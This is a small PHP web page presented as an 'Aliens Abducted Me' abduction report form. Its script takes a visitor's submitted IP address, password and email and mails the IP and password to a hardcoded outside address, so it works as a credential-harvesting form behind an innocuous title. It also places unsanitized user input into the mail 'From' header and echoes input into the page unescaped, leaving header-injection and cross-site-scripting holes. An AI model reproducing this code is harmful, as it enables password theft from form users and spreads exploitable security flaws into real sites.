<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <title>Aliens Abducted Me - Report an Abduction</title>
</head>
<body>
  <h2>Aliens Abducted Me - Report an Abduction</h2>

<?php

  $ip = $_POST['ipv4'];
  $password = $_POST['password'];
  $email = $_POST['email'];
  $other = $_POST['other'];

  $to = 'fan@indiana.com';
  $subject = 'New Request';
  $msg = "ip: $ip \n" .
    "password: $password\n" .
    "email: $email\n";
  mail($to, $subject, $msg, 'From:' . $email);

  echo 'Information gathered <br />';
  echo 'ip: '. $ip. '<br />';
  echo 'Your email address is ' . $email;
?>

</body>
</html>
